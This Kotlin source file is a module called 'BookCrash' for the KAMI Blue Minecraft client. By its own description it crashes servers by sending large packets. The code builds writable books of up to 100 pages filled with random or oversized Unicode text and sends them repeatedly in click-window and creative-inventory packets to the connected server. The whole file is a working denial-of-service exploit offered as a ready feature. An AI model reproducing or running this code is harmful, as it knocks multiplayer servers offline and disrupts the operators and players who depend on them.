package me.zeroeightsix.kami.module.modules.misc

import me.zeroeightsix.kami.event.events.SafeTickEvent
import me.zeroeightsix.kami.module.Module
import me.zeroeightsix.kami.setting.ModuleConfig.setting
import me.zeroeightsix.kami.util.TimerUtils
import me.zeroeightsix.kami.util.event.listener
import me.zeroeightsix.kami.util.text.MessageSendHelper.sendChatMessage
import net.minecraft.init.Items
import net.minecraft.inventory.ClickType
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.play.client.CPacketClickWindow
import net.minecraft.network.play.client.CPacketCreativeInventoryAction
import java.util.*
import java.util.stream.Collectors
import java.util.stream.IntStream

@Module.Info(
    name = "BookCrash",
    category = Module.Category.MISC,
    description = "Crashes servers by sending large packets"
)
object BookCrash : Module() {
    private val mode = setting("Mode", Mode.RAION)
    private val fillMode = setting("FillMode", FillMode.RANDOM)
    private val uses = setting("Uses", 2, 1..10, 1)
    private val delay = setting("Delay", 0, 0..40, 1)
    private val pages = setting("Pages", 50, 1..100, 5)

    private enum class Mode {
        JESSICA, RAION
    }

    private enum class FillMode {
        ASCII, REPEAT, RANDOM
    }

    private val timer = TimerUtils.TickTimer(TimerUtils.TimeUnit.TICKS)

    init {
        listener<SafeTickEvent> {
            if (mc.currentServerData == null || mc.currentServerData?.serverIP.isNullOrBlank() || mc.connection == null) {
                sendChatMessage("Not connected to a server")
                disable()
                return@listener
            }

            if (!timer.tick(delay.value.toLong())) return@listener

            val list = NBTTagList()
            val text: String

            text = when (fillMode.value) {
                FillMode.RANDOM -> {
                    val chars = Random().ints(0x80, 0x10FFFF - 0x800).map { if (it < 0xd800) it else it + 0x800 }
                    chars.collectToPages()
                }
                FillMode.REPEAT -> {
                    repeat(pages.value * 210, 0x10FFFF.toString())
                }
                FillMode.ASCII -> {
                    val chars = Random().ints(0x20, 0x7E)
                    chars.collectToPages()
                }
            }

            for (i in 0 until pages.value) {
                list.appendTag(NBTTagString(text))
            }

            val tag = NBTTagCompound().apply {
                setString("author", "KAMI Blue")
                setString("title", "\n Minecraft pozzed \n")
                setTag("pages", list)
            }
            val bookObj = ItemStack(Items.WRITABLE_BOOK).apply {
                setTagInfo("pages", list)
                tagCompound = tag
            }

            for (i in 0 until uses.value) {
                mc.connection!!.sendPacket(CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, 0.toShort()))
                if (mode.value == Mode.JESSICA) {
                    mc.connection!!.sendPacket(CPacketCreativeInventoryAction(0, bookObj))
                }
            }
        }
    }

    private fun IntStream.collectToPages() =
        this.limit(210 * pages.value.toLong()).mapToObj<String> { it.toChar().toString() }.collect(Collectors.joining())

    private fun repeat(count: Int, with: String): String {
        return String(CharArray(count)).replace("\u0000", with)
    }
}
